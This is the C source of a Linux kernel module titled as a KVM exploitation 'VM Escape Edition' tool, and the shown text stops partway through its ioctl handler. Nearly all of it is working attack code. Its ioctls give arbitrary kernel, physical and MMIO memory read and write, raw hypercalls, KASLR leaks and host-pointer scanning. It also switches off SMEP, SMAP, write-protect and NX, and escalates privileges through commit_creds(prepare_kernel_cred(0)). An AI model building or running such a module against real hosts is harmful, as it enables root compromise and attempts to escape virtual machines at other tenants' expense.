#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/errno.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/ktime.h>
#include <linux/types.h>
#include <linux/byteorder/generic.h>
#include <linux/kvm_para.h>
#include <linux/page-flags.h>
#include <linux/pagemap.h>
#include <linux/kdev_t.h>
#include <linux/err.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/delay.h>
#include <asm/io.h>
#include <asm/pgtable.h>

/* x86-specific includes */
#ifdef CONFIG_X86
#include <asm/tlbflush.h>
#include <asm/cacheflush.h>
#include <asm/processor.h>
#include <asm/msr.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 12, 0)
#include <linux/set_memory.h>
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 2, 0)
#include <asm/set_memory.h>
#endif
#endif

#define DRIVER_NAME "kvm_probe_drv"
#define DEVICE_FILE_NAME "kvm_probe_dev"

#define VQ_PAGE_ORDER 0
#define VQ_PAGE_SIZE (1UL << (PAGE_SHIFT + VQ_PAGE_ORDER))
#define MAX_VQ_DESCS 256
#define MAX_SYMBOL_NAME 128
#define MAX_DMA_PAGES 64

MODULE_LICENSE("GPL");
MODULE_AUTHOR("KVM Probe Lab");
MODULE_DESCRIPTION("Kernel module for KVM exploitation - VM Escape Edition");
MODULE_VERSION("4.0");

/* ========================================================================
 * Kernel Version Compatibility Macros
 * ======================================================================== */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
#define CLASS_CREATE_COMPAT(name) class_create(name)
#else
#define CLASS_CREATE_COMPAT(name) class_create(THIS_MODULE, name)
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name) = NULL;

static int kallsyms_lookup_init(void) {
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
    };

    if (register_kprobe(&kp) < 0) {
        return -1;
    }

    kallsyms_lookup_name_ptr = (unsigned long (*)(const char *))kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_ptr) {
        return -1;
    }

    return 0;
}

#define KALLSYMS_LOOKUP_NAME(name) kallsyms_lookup_name_ptr(name)
#else
#define KALLSYMS_LOOKUP_NAME(name) kallsyms_lookup_name(name)
static int kallsyms_lookup_init(void) { return 0; }
#endif

#ifndef CONFIG_X86
#define sync_core() mb()
#endif

/* ========================================================================
 * KASLR Slide Detection & Address Translation
 * ======================================================================== */

static unsigned long g_kaslr_slide = 0;
static unsigned long g_kernel_text_base = 0;
static unsigned long g_kernel_base = 0;
static bool g_kaslr_initialized = false;

static unsigned long g_symbol_commit_creds = 0;
static unsigned long g_symbol_prepare_kernel_cred = 0;
static unsigned long g_symbol_init_task = 0;
static unsigned long g_symbol_swapper_pg_dir = 0;
static unsigned long g_symbol_init_mm = 0;
static unsigned long g_symbol_write_flag = 0;

static int init_kaslr_slide(void) {
    unsigned long stext_addr = 0;
    unsigned long _text_addr = 0;

#if IS_ENABLED(CONFIG_KALLSYMS)
    stext_addr = KALLSYMS_LOOKUP_NAME("_stext");
    if (!stext_addr) {
        stext_addr = KALLSYMS_LOOKUP_NAME("stext");
    }

    _text_addr = KALLSYMS_LOOKUP_NAME("_text");
    if (!_text_addr) {
        _text_addr = KALLSYMS_LOOKUP_NAME("text");
    }

    if (stext_addr) {
        g_kernel_text_base = stext_addr;
    } else if (_text_addr) {
        g_kernel_text_base = _text_addr;
    } else {
        return -ENOENT;
    }

    g_kaslr_slide = g_kernel_text_base - 0xffffffff80000000UL;
    g_kernel_base = (unsigned long)PAGE_OFFSET + g_kaslr_slide;
    g_kaslr_initialized = true;

    return 0;
#else
    return -ENOENT;
#endif
}

static int cache_important_symbols(void) {
#if IS_ENABLED(CONFIG_KALLSYMS)
    g_symbol_commit_creds = KALLSYMS_LOOKUP_NAME("commit_creds");
    g_symbol_prepare_kernel_cred = KALLSYMS_LOOKUP_NAME("prepare_kernel_cred");
    g_symbol_init_task = KALLSYMS_LOOKUP_NAME("init_task");
    g_symbol_swapper_pg_dir = KALLSYMS_LOOKUP_NAME("swapper_pg_dir");
    g_symbol_init_mm = KALLSYMS_LOOKUP_NAME("init_mm");
    g_symbol_write_flag = KALLSYMS_LOOKUP_NAME("write_flag");
    return 0;
#else
    return -ENOENT;
#endif
}

static inline unsigned long apply_kaslr_slide(unsigned long unslid_addr) {
    if (!g_kaslr_initialized) {
        return unslid_addr;
    }

    if (unslid_addr >= 0xffffffff80000000UL && unslid_addr < 0xffffffffa0000000UL) {
        return unslid_addr + g_kaslr_slide;
    }

    if (unslid_addr >= (unsigned long)PAGE_OFFSET) {
        return unslid_addr;
    }

    if (unslid_addr >= 0xffffffffa0000000UL) {
        return unslid_addr;
    }

    if (unslid_addr < 0x1000000UL) {
        return g_kernel_base + unslid_addr;
    }

    return unslid_addr;
}

static inline bool is_kernel_address(unsigned long addr) {
    return (addr >= (unsigned long)PAGE_OFFSET) ||
           (addr >= 0xffffffff80000000UL && addr <= 0xffffffffffffffffUL);
}

static unsigned long lookup_symbol(const char *name) {
    unsigned long addr = 0;
#if IS_ENABLED(CONFIG_KALLSYMS)
    addr = KALLSYMS_LOOKUP_NAME(name);
#endif
    return addr;
}

/* ========================================================================
 * Protection Control Variables
 * ======================================================================== */

static unsigned long g_original_cr4 = 0;
static unsigned long g_original_cr0 = 0;
static u64 g_original_efer = 0;
static bool g_smep_disabled = false;
static bool g_smap_disabled = false;
static bool g_wp_disabled = false;
static bool g_nx_enabled = false;

#define MSR_EFER 0xC0000080
#define EFER_NXE (1 << 11)

/* ========================================================================
 * CR/MSR Operations
 * ======================================================================== */

#ifdef CONFIG_X86
static inline unsigned long my_read_cr4(void) {
    unsigned long cr4;
    asm volatile("mov %%cr4, %0" : "=r"(cr4));
    return cr4;
}

static inline void my_write_cr4(unsigned long cr4) {
    asm volatile("mov %0, %%cr4" : : "r"(cr4) : "memory");
}

static inline unsigned long my_read_cr0(void) {
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    return cr0;
}

static inline void my_write_cr0(unsigned long cr0) {
    asm volatile("mov %0, %%cr0" : : "r"(cr0) : "memory");
}

static inline u64 my_rdmsr(u32 msr) {
    u32 low, high;
    asm volatile("rdmsr" : "=a"(low), "=d"(high) : "c"(msr));
    return ((u64)high << 32) | low;
}

static inline void my_wrmsr(u32 msr, u64 value) {
    u32 low = value & 0xffffffff;
    u32 high = value >> 32;
    asm volatile("wrmsr" : : "c"(msr), "a"(low), "d"(high));
}

static inline unsigned long my_read_cr2(void) {
    unsigned long cr2;
    asm volatile("mov %%cr2, %0" : "=r"(cr2));
    return cr2;
}

static inline unsigned long my_read_cr3(void) {
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static inline void my_write_cr3(unsigned long cr3) {
    asm volatile("mov %0, %%cr3" : : "r"(cr3) : "memory");
}
#endif

/* Protection control functions */
static void disable_smep(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    g_original_cr4 = current_cr4;
    unsigned long new_cr4 = current_cr4 & ~(1UL << 20);
    my_write_cr4(new_cr4);
    g_smep_disabled = true;
#endif
}

static void enable_smep(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    unsigned long new_cr4 = current_cr4 | (1UL << 20);
    my_write_cr4(new_cr4);
    g_smep_disabled = false;
#endif
}

static void disable_smap(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    g_original_cr4 = current_cr4;
    unsigned long new_cr4 = current_cr4 & ~(1UL << 21);
    my_write_cr4(new_cr4);
    g_smap_disabled = true;
#endif
}

static void enable_smap(void) {
#ifdef CONFIG_X86
    unsigned long current_cr4 = my_read_cr4();
    unsigned long new_cr4 = current_cr4 | (1UL << 21);
    my_write_cr4(new_cr4);
    g_smap_disabled = false;
#endif
}

static void disable_wp(void) {
#ifdef CONFIG_X86
    unsigned long current_cr0 = my_read_cr0();
    g_original_cr0 = current_cr0;
    unsigned long new_cr0 = current_cr0 & ~(1UL << 16);
    my_write_cr0(new_cr0);
    g_wp_disabled = true;
#endif
}

static void enable_wp(void) {
#ifdef CONFIG_X86
    unsigned long current_cr0 = my_read_cr0();
    unsigned long new_cr0 = current_cr0 | (1UL << 16);
    my_write_cr0(new_cr0);
    g_wp_disabled = false;
#endif
}

static void enable_nx(void) {
#ifdef CONFIG_X86
    u64 current_efer;
    if (!g_original_efer) {
        current_efer = my_rdmsr(MSR_EFER);
        g_original_efer = current_efer;
    } else {
        current_efer = my_rdmsr(MSR_EFER);
    }

    if (!(current_efer & EFER_NXE)) {
        u64 new_efer = current_efer | EFER_NXE;
        my_wrmsr(MSR_EFER, new_efer);
        g_nx_enabled = true;
    }
#endif
}

static void disable_nx(void) {
#ifdef CONFIG_X86
    u64 current_efer = my_rdmsr(MSR_EFER);
    u64 new_efer = current_efer & ~EFER_NXE;
    my_wrmsr(MSR_EFER, new_efer);
    g_nx_enabled = false;
#endif
}

static void restore_protections(void) {
#ifdef CONFIG_X86
    if (g_smep_disabled || g_smap_disabled) {
        my_write_cr4(g_original_cr4);
        g_smep_disabled = false;
        g_smap_disabled = false;
    }
    if (g_wp_disabled) {
        my_write_cr0(g_original_cr0);
        g_wp_disabled = false;
    }
    if (g_nx_enabled) {
        my_wrmsr(MSR_EFER, g_original_efer);
        g_nx_enabled = false;
    }
#endif
}

/* ========================================================================
 * Global Variables
 * ======================================================================== */

static int major_num = -1;
static struct class* driver_class = NULL;
static struct device* driver_device = NULL;

static void *g_vq_virt_addr = NULL;
static dma_addr_t g_vq_phys_addr = 0;
static unsigned long g_vq_pfn = 0;

/* DMA page tracking for VM escape attempts */
static struct page *g_dma_pages[MAX_DMA_PAGES];
static dma_addr_t g_dma_addrs[MAX_DMA_PAGES];
static int g_dma_page_count = 0;

/* ========================================================================
 * Structure Definitions
 * ======================================================================== */

struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vring_desc_kernel {
    __le64 addr;
    __le32 len;
    __le16 flags;
    __le16 next;
};

struct vq_desc_user_data {
    u16 index;
    u64 phys_addr;
    u32 len;
    u16 flags;
    u16 next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char __user *user_buf;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
    long result;
};

struct patch_req {
    unsigned long dst_va;
    unsigned long size;
    unsigned char __user *user_buf;
};

struct symbol_lookup {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
};

struct msr_data {
    unsigned int msr;
    unsigned long long value;
};

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct va_scan_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

struct va_write_data {
    unsigned long va;
    unsigned long size;
    unsigned char __user *user_buffer;
};

/* New structures for VM escape */
struct dma_alloc_req {
    unsigned int count;
    unsigned long __user *addrs;
};

struct mmio_probe_req {
    unsigned long base_addr;
    unsigned long size;
    unsigned long stride;
    unsigned char __user *results;
};

struct host_ptr_scan {
    unsigned long phys_start;
    unsigned long phys_end;
    unsigned long stride;
    unsigned long __user *found_ptrs;
    unsigned int __user *found_count;
    unsigned int max_count;
};

/* ========================================================================
 * IOCTL Command Definitions
 * ======================================================================== */

#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_LOOKUP_SYMBOL      0x1013
#define IOCTL_GET_KERNEL_BASE    0x1014
#define IOCTL_DISABLE_SMEP       0x1015
#define IOCTL_DISABLE_SMAP       0x1016
#define IOCTL_DISABLE_WP         0x1017
#define IOCTL_READ_CR4           0x1018
#define IOCTL_WRITE_CR4          0x1019
#define IOCTL_READ_MSR           0x101A
#define IOCTL_WRITE_MSR          0x101B
#define IOCTL_GET_CURRENT_TASK   0x101C
#define IOCTL_ESCALATE_PRIVILEGES 0x101D
#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_WRITE_PHYSICAL     0x101F
#define IOCTL_ALLOC_ROOT_PAGES   0x1020
#define IOCTL_ENABLE_NX          0x1021
#define IOCTL_DISABLE_NX         0x1022
#define IOCTL_READ_EFER          0x1023
#define IOCTL_WRITE_EFER         0x1024
#define IOCTL_ENABLE_SMEP        0x1025
#define IOCTL_ENABLE_SMAP        0x1026
#define IOCTL_ENABLE_WP          0x1027
#define IOCTL_READ_CR0           0x1028
#define IOCTL_WRITE_CR0          0x1029
#define IOCTL_CHECK_STATUS       0x102A

/* New IOCTLs for VM escape */
#define IOCTL_ALLOC_DMA_PAGES    0x1030
#define IOCTL_FREE_DMA_PAGES     0x1031
#define IOCTL_PROBE_MMIO_RANGE   0x1032
#define IOCTL_SCAN_HOST_PTRS     0x1033
#define IOCTL_READ_CR2           0x1034
#define IOCTL_READ_CR3           0x1035
#define IOCTL_WRITE_CR3          0x1036
#define IOCTL_RAW_VMCALL         0x1037
#define IOCTL_RAW_VMMCALL        0x1038
#define IOCTL_GET_PHYS_MEM_INFO  0x1039
#define IOCTL_MAP_HOST_ADDR      0x103A

/* ========================================================================
 * Hypercall Implementation
 * ======================================================================== */

static inline long kvm_hypercall_vmcall(unsigned int nr, unsigned long a0,
                                         unsigned long a1, unsigned long a2,
                                         unsigned long a3) {
    long ret;
    asm volatile(
        "vmcall"
        : "=a"(ret)
        : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
        : "memory"
    );
    return ret;
}

static inline long kvm_hypercall_vmmcall(unsigned int nr, unsigned long a0,
                                          unsigned long a1, unsigned long a2,
                                          unsigned long a3) {
    long ret;
    asm volatile(
        "vmmcall"
        : "=a"(ret)
        : "a"(nr), "b"(a0), "c"(a1), "d"(a2), "S"(a3)
        : "memory"
    );
    return ret;
}

static inline long kvm_hypercall(unsigned int nr) {
    long ret;
    asm volatile(
        "vmcall"
        : "=a"(ret)
        : "a"(nr)
        : "memory"
    );
    return ret;
}

static long trigger_hypercall(void) {
    long ret = 0;
    unsigned int hypercalls[] = {100, 101, 102, 103};
    int i;

    for (i = 0; i < 4; i++) {
        ret = kvm_hypercall(hypercalls[i]);
        if (ret != 0 && ret != -1000) {
            printk(KERN_DEBUG "%s: Hypercall #%u returned: %ld\n",
                   DRIVER_NAME, hypercalls[i], ret);
        }
    }
    return ret;
}

static long do_hypercall(struct hypercall_args *args) {
    long ret;
    ret = kvm_hypercall_vmcall(args->nr, args->arg0, args->arg1,
                               args->arg2, args->arg3);
    args->result = ret;
    return ret;
}

/* ========================================================================
 * Physical Memory Operations
 * ======================================================================== */

static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
    void __iomem *mem;

    mem = ioremap(phys_addr, size);
    if (!mem) {
        return -EFAULT;
    }

    memcpy_fromio(buffer, mem, size);
    iounmap(mem);
    return 0;
}

static int write_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size) {
    void __iomem *mem;

    mem = ioremap(phys_addr, size);
    if (!mem) {
        return -EFAULT;
    }

    memcpy_toio(mem, buffer, size);
    iounmap(mem);
    return 0;
}

/* Allocate DMA-capable pages */
static int alloc_dma_pages(unsigned int count, unsigned long __user *user_addrs) {
    unsigned int i;

    if (count > MAX_DMA_PAGES - g_dma_page_count) {
        count = MAX_DMA_PAGES - g_dma_page_count;
    }

    if (count == 0) {
        return -ENOMEM;
    }

    for (i = 0; i < count; i++) {
        struct page *page;
        unsigned long phys;

        page = alloc_page(GFP_KERNEL | __GFP_ZERO | __GFP_DMA);
        if (!page) {
            break;
        }

        g_dma_pages[g_dma_page_count] = page;
        phys = page_to_phys(page);
        g_dma_addrs[g_dma_page_count] = phys;

        if (copy_to_user(&user_addrs[i], &phys, sizeof(phys))) {
            __free_page(page);
            return -EFAULT;
        }

        g_dma_page_count++;
    }

    return i;
}

/* Free all DMA pages */
static void free_dma_pages(void) {
    int i;

    for (i = 0; i < g_dma_page_count; i++) {
        if (g_dma_pages[i]) {
            __free_page(g_dma_pages[i]);
            g_dma_pages[i] = NULL;
        }
    }
    g_dma_page_count = 0;
}

/* Allocate root pages */
static int alloc_root_pages(unsigned long __user *user_pages, int count) {
    struct page **pages;
    int i, j;

    if (count <= 0 || count > 16) {
        return -EINVAL;
    }

    pages = kmalloc_array(count, sizeof(struct page *), GFP_KERNEL);
    if (!pages) {
        return -ENOMEM;
    }

    for (i = 0; i < count; i++) {
        unsigned long phys;
        
        pages[i] = alloc_page(GFP_KERNEL | __GFP_ZERO);
        if (!pages[i]) {
            for (j = 0; j < i; j++) {
                __free_page(pages[j]);
            }
            kfree(pages);
            return -ENOMEM;
        }

        phys = page_to_phys(pages[i]);
        if (copy_to_user(&user_pages[i], &phys, sizeof(phys))) {
            for (j = 0; j <= i; j++) {
                __free_page(pages[j]);
            }
            kfree(pages);
            return -EFAULT;
        }
    }

    kfree(pages);
    return 0;
}

/* ========================================================================
 * VM Escape Helpers
 * ======================================================================== */

/* Check if value looks like a host kernel pointer */
static inline bool looks_like_host_ptr(unsigned long value) {
    /* Host kernel text */
    if (value >= 0xffffffff80000000UL && value < 0xffffffffa0000000UL) {
        return true;
    }
    /* Host direct mapping */
    if (value >= 0xffff888000000000UL && value < 0xffffc88000000000UL) {
        return true;
    }
    /* Host module space */
    if (value >= 0xffffffffa0000000UL && value < 0xffffffffc0000000UL) {
        return true;
    }
    return false;
}

/* Probe MMIO range looking for interesting values */
static int probe_mmio_range(struct mmio_probe_req *req) {
    unsigned long addr;
    void __iomem *mmio;
    int count = 0;

    for (addr = req->base_addr; addr < req->base_addr + req->size; addr += req->stride) {
        u64 value;
        
        mmio = ioremap(addr, 8);
        if (!mmio) continue;

        value = readq(mmio);
        iounmap(mmio);

        if (looks_like_host_ptr(value)) {
            if (copy_to_user(req->results + count * sizeof(u64), &value, sizeof(value))) {
                return -EFAULT;
            }
            count++;
            if (count >= 256) break;
        }
    }

    return count;
}

/* Scan physical memory for host pointers */
static int scan_for_host_ptrs(struct host_ptr_scan *scan) {
    unsigned long addr;
    unsigned int found = 0;
    unsigned char buf[4096];

    for (addr = scan->phys_start; addr < scan->phys_end && found < scan->max_count; addr += scan->stride) {
        size_t off;
        
        if (read_physical_memory(addr, buf, 4096) != 0) {
            continue;
        }

        for (off = 0; off <= 4096 - 8 && found < scan->max_count; off += 8) {
            unsigned long value = *(unsigned long *)(buf + off);

            if (looks_like_host_ptr(value)) {
                unsigned long found_addr = addr + off;
                if (copy_to_user(&scan->found_ptrs[found * 2], &found_addr, sizeof(found_addr))) {
                    return -EFAULT;
                }
                if (copy_to_user(&scan->found_ptrs[found * 2 + 1], &value, sizeof(value))) {
                    return -EFAULT;
                }
                found++;
            }
        }
    }

    if (copy_to_user(scan->found_count, &found, sizeof(found))) {
        return -EFAULT;
    }

    return 0;
}

/* Privilege escalation */
static void escalate_privileges(void) {
#if IS_ENABLED(CONFIG_KALLSYMS)
    if (g_symbol_commit_creds && g_symbol_prepare_kernel_cred) {
        typedef void* (*prepare_kernel_cred_t)(void*);
        typedef int (*commit_creds_t)(void*);

        prepare_kernel_cred_t prepare_kernel_cred =
            (prepare_kernel_cred_t)g_symbol_prepare_kernel_cred;
        commit_creds_t commit_creds =
            (commit_creds_t)g_symbol_commit_creds;

        void *cred = prepare_kernel_cred(0);
        if (cred) {
            commit_creds(cred);
        }
    }
#endif
}

/* ========================================================================
 * IOCTL Handler
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    struct port_io_data p_io_data_kernel;
    struct mmio_data m_io_data_kernel;
    void __iomem *mapped_addr = NULL;
    unsigned long len_to_copy;
    unsigned char *k_mmio_buffer = NULL;

    switch (cmd) {

        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_lookup req;

            if (copy_from_user(&req, (struct symbol_lookup __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = lookup_symbol(req.name);

            if (req.address == 0) {
                return -ENOENT;
            }

            if (copy_to_user((struct symbol_lookup __user *)arg, &req, sizeof(req))) {
                return -EFAULT;
            }

            trigger_hypercall();
            return 0;
        }

        case IOCTL_GET_KASLR_SLIDE: {
            if (copy_to_user((unsigned long __user *)arg, &g_kaslr_slide, sizeof(g_kaslr_slide))) {
                return -EFAULT;
            }
            return 0;
        }

        case IOCTL_GET_KERNEL_BASE: {
            if (copy_to_user((unsigned long __user *)arg, &g_kernel_base, sizeof(g_kernel_base))) {
                return -EFAULT;
            }
            return 0;
        }

        case IOCTL_READ_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {
                return -EINVAL;
            }
            switch (p_io_data_kernel.size) {
                case 1: p_io_data_kernel.value = inb(p_io_data_kernel.port); break;
                case 2: p_io_data_kernel.value = inw(p_io_data_kernel.port); break;
                case 4: p_io_data_kernel.value = inl(p_io_data_kernel.port); break;
            }
            if (copy_to_user((struct port_io_data __user *)arg, &p_io_data_kernel, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            trigger_hypercall();
            break;

        case IOCTL_WRITE_PORT:
            if (copy_from_user(&p_io_data_kernel, (struct port_io_data __user *)arg, sizeof(p_io_data_kernel))) {
                return -EFAULT;
            }
            if (p_io_data_kernel.size != 1 && p_io_data_kernel.size != 2 && p_io_data_kernel.size != 4) {
                return -EINVAL;
            }
            switch (p_io_data_kernel.size) {
                case 1: outb((u8)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 2: outw((u16)p_io_data_kernel.value, p_io_data_kernel.port); break;
                case 4: outl((u32)p_io_data_kernel.value, p_io_data_kernel.port); break;
            }
            trigger_hypercall();
            break;

        case IOCTL_READ_MMIO: {
            struct mmio_data data;
            void __iomem *mmio;
            void *kbuf;

            if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {
                return -EFAULT;
            }

            mmio = ioremap(data.phys_addr, data.size);
            if (!mmio) {
                return -EFAULT;
            }

            kbuf = kmalloc(data.size, GFP_KERNEL);
            if (!kbuf) {
                iounmap(mmio);
                return -ENOMEM;
            }

            memcpy_fromio(kbuf, mmio, data.size);

            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
                kfree(kbuf);
                iounmap(mmio);
                return -EFAULT;
            }

            kfree(kbuf);
            iounmap(mmio);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_WRITE_MMIO: {
            unsigned long map_size;

            if (copy_from_user(&m_io_data_kernel, (struct mmio_data __user *)arg, sizeof(m_io_data_kernel))) {
                return -EFAULT;
            }

            map_size = m_io_data_kernel.size > 0 ? m_io_data_kernel.size : m_io_data_kernel.value_size;
            if (map_size == 0) {
                return -EINVAL;
            }

            mapped_addr = ioremap(m_io_data_kernel.phys_addr, map_size);
            if (!mapped_addr) {
                return -ENOMEM;
            }

            if (m_io_data_kernel.size > 0) {
                if (!m_io_data_kernel.user_buffer) {
                    iounmap(mapped_addr);
                    return -EFAULT;
                }

                k_mmio_buffer = kmalloc(m_io_data_kernel.size, GFP_KERNEL);
                if (!k_mmio_buffer) {
                    iounmap(mapped_addr);
                    return -ENOMEM;
                }

                if (copy_from_user(k_mmio_buffer, m_io_data_kernel.user_buffer, m_io_data_kernel.size)) {
                    kfree(k_mmio_buffer);
                    iounmap(mapped_addr);
                    return -EFAULT;
                }

                for (len_to_copy = 0; len_to_copy < m_io_data_kernel.size; ++len_to_copy) {
                    writeb(k_mmio_buffer[len_to_copy], mapped_addr + len_to_copy);
                }

                kfree(k_mmio_buffer);
            } else {
                switch(m_io_data_kernel.value_size) {
                    case 1: writeb((u8)m_io_data_kernel.single_value, mapped_addr); break;
                    case 2: writew((u16)m_io_data_kernel.single_value, mapped_addr); break;
                    case 4: writel((u32)m_io_data_kernel.single_value, mapped_addr); break;
                    case 8: writeq(m_io_data_kernel.single_value, mapped_addr); break;
                    default:
                        iounmap(mapped_addr);
                        return -EINVAL;
                }
            }

            iounmap(mapped_addr);
            trigger_hypercall();
            return 0;
        }

        case IOCTL_READ_KERNEL_MEM: {
            struct kvm_kernel_mem_read req;
            unsigned long actual_addr;

            if (copy_from_user(&req, (struct kvm_kernel_mem_read __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buf) {
                return -EINVAL;
            }

            actual_addr = apply_kaslr_slide(req.kernel_addr);

            if (copy_to_user(req.user_buf, (void *)actual_addr, req.length)) {
                return -EFAULT;
            }

            trigger_hypercall();
            break;
        }

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kvm_kernel_mem_write req;
            unsigned long actual_addr;
            void *tmp;

            if (copy_from_user(&req, (struct kvm_kernel_mem_write __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buf) {
                return -EINVAL;
            }

            actual_addr = apply_kaslr_slide(req.kernel_addr);

            tmp = kmalloc(req.length, GFP_KERNEL);
            if (!tmp) {
                return -ENOMEM;
            }

            if (copy_from_user(tmp, req.user_buf, req.length)) {
                kfree(tmp);
                return -EFAULT;
            }

            memcpy((void *)actual_addr, tmp, req.length);
            kfree(tmp);
            trigger_hypercall();
            break;
        }

        case IOCTL_ALLOC_VQ_PAGE: {
            struct page *vq_page_ptr;
            unsigned long pfn_to_user;

            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }

            vq_page_ptr = alloc_pages(GFP_KERNEL | __GFP_ZERO, VQ_PAGE_ORDER);
            if (!vq_page_ptr) {
                return -ENOMEM;
            }

            g_vq_virt_addr = page_address(vq_page_ptr);
            g_vq_phys_addr = page_to_phys(vq_page_ptr);
            g_vq_pfn = PFN_DOWN(g_vq_phys_addr);
            pfn_to_user = g_vq_pfn;

            if (copy_to_user((unsigned long __user *)arg, &pfn_to_user, sizeof(pfn_to_user))) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
                return -EFAULT;
            }

            trigger_hypercall();
            break;
        }

        case IOCTL_FREE_VQ_PAGE: {
            if (g_vq_virt_addr) {
                free_pages((unsigned long)g_vq_virt_addr, VQ_PAGE_ORDER);
                g_vq_virt_addr = NULL;
                g_vq_phys_addr = 0;
                g_vq_pfn = 0;
            }
            trigger_hypercall();
            break;
        }

        case IOCTL_WRITE_VQ_DESC: {
            struct vq_desc_user_data user_desc_data_kernel;
            struct vring_desc_kernel *kernel_desc_ptr_local;
            unsigned int max_descs_in_page_local;

            if (!g_vq_virt_addr) {
                return -ENXIO;
            }

            if (copy_from_user(&user_desc_data_kernel, (struct vq_desc_user_data __user *)arg, sizeof(user_desc_data_kernel))) {
                return -EFAULT;
            }

            max_descs_in_page_local = VQ_PAGE_SIZE / sizeof(struct vring_desc_kernel);
            if (user_desc_data_kernel.index >= max_descs_in_page_local) {
                return -EINVAL;
            }

            kernel_desc_ptr_local = (struct vring_desc_kernel *)g_vq_virt_addr + user_desc_data_kernel.index;
            kernel_desc_ptr_local->addr = cpu_to_le64(user_desc_data_kernel.phys_addr);
            kernel_desc_ptr_local->len = cpu_to_le32(user_desc_data_kernel.len);
            kernel_desc_ptr_local->flags = cpu_to_le16(user_desc_data_kernel.flags);
            kernel_desc_ptr_local->next = cpu_to_le16(user_desc_data_kernel.next_idx);

            trigger_hypercall();
            break;
        }

        case IOCTL_TRIGGER_HYPERCALL: {
            long ret = trigger_hypercall();

            if (copy_to_user((long __user *)arg, &ret, sizeof(ret))) {
                return -EFAULT;
            }
            break;
        }

        case IOCTL_HYPERCALL_ARGS: {
            struct hypercall_args args;

            if (copy_from_user(&args, (void __user *)arg, sizeof(args))) {
                return -EFAULT;
            }

            do_hypercall(&args);

            if (copy_to_user((void __user *)arg, &args, sizeof(args))) {
                return -EFAULT;
            }
            break;
        }

        case IOCTL_VIRT_TO_PHYS: {
            unsigned long va, pa = 0;

            if (copy_from_user(&va, (void __user *)arg, sizeof(va))) {
                return -EFAULT;
            }

